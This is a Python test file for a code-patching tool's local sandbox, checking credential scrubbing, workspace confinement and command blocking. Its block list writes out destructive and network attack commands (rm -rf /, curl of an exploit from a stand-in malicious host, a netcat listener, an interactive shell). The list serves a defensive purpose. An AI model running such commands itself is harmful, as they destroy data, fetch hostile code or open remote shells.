"""
Local Sandbox Security & Trust Boundary Tests.
Verifies:
1. Environment credential scrubbing (no API keys or tokens leaked to subprocess).
2. Command pattern blacklisting (destructive or network commands rejected).
3. Filesystem root containment (execution outside workspace root forbidden).
4. Truthful backend identification ("local_subprocess_isolated", zero fake cloud claims).
"""

import os
import sys
import pytest
from patchpilot.sandbox.security import SandboxSecurityPolicy, SecurityViolationError
from patchpilot.sandbox.local import LocalSubprocessDriver


def test_sandbox_security_credential_scrubbing():
    """
    Simulates a host environment loaded with sensitive credentials.
    Verifies that sanitize_environment thoroughly strips every credential.
    """
    dirty_env = {
        "PATH": "C:\\Windows\\System32;/usr/bin",
        "PYTHONPATH": "src/",
        "NEBIUS_API_KEY": "secret_nebius_key_12345",
        "TAVILY_API_KEY": "mock_dummy_tavily_secret_key",
        "AWS_SECRET_ACCESS_KEY": "AKIAIOSFODNN7EXAMPLE",
        "GITHUB_TOKEN": "ghp_xxxxxxxxxxxxxxxxxxxx",
        "DATABASE_PASSWORD": "supersecretpassword",
        "SSH_AUTH_SOCK": "/tmp/ssh.sock",
        "SAFE_CUSTOM_APP_VAR": "harmless",
    }

    cleaned = SandboxSecurityPolicy.sanitize_environment(dirty_env)

    # All credentials stripped
    assert "NEBIUS_API_KEY" not in cleaned
    assert "TAVILY_API_KEY" not in cleaned
    assert "AWS_SECRET_ACCESS_KEY" not in cleaned
    assert "GITHUB_TOKEN" not in cleaned
    assert "DATABASE_PASSWORD" not in cleaned
    assert "SSH_AUTH_SOCK" not in cleaned

    # Safe environment preserved
    assert cleaned["PATH"] == "C:\\Windows\\System32;/usr/bin"
    assert cleaned["PYTHONPATH"] == "src/"
    assert cleaned["PYTHONDONTWRITEBYTECODE"] == "1"


def test_sandbox_forbidden_command_rejection():
    """
    Verifies that dangerous shell patterns and remote download attempts
    are blocked before subprocess spawning.
    """
    driver = LocalSubprocessDriver()

    forbidden_commands = [
        ["rm", "-rf", "/"],
        ["curl", "-s", "https://malicious.example.com/exploit.py"],
        ["wget", "http://attack.example.com"],
        ["nc", "-lvp", "4444"],
        ["bash", "-i"],
    ]

    for cmd in forbidden_commands:
        rc, out, _ = driver.run_command(cmd, cwd=os.getcwd())
        assert rc == -3, f"Expected security rejection (-3) for command {cmd}, got {rc}"
        assert "SECURITY_VIOLATION" in out


def test_sandbox_filesystem_boundary_confinement(tmp_path):
    """
    Verifies that LocalSubprocessDriver enforces strict workspace containment.
    Attempts to execute commands outside workspace_root or traverse upward must be rejected.
    """
    workspace = tmp_path / "sandbox_workspace"
    workspace.mkdir()
    outside_dir = tmp_path / "outside_system"
    outside_dir.mkdir()

    driver = LocalSubprocessDriver(workspace_root=str(workspace))

    # Permitted execution inside workspace
    cmd = [sys.executable, "-c", "print('hello_sandbox')"]
    rc, out, _ = driver.run_command(cmd, cwd=str(workspace))
    assert rc == 0
    assert "hello_sandbox" in out

    # Forbidden execution outside workspace
    rc_out, out_out, _ = driver.run_command(cmd, cwd=str(outside_dir))
    assert rc_out == -3
    assert "SECURITY_VIOLATION" in out_out
    assert "escapes repo root" in out_out


def test_sandbox_truthful_backend_identity():
    """
    Ensures LocalSubprocessDriver truthfully identifies as local_subprocess_isolated
    and never claims to be ConTree or cloud sandbox.
    """
    driver = LocalSubprocessDriver()
    assert driver.get_backend_name() == "local_subprocess_isolated"
    assert "contree" not in driver.get_backend_name().lower()
    assert "cloud" not in driver.get_backend_name().lower()
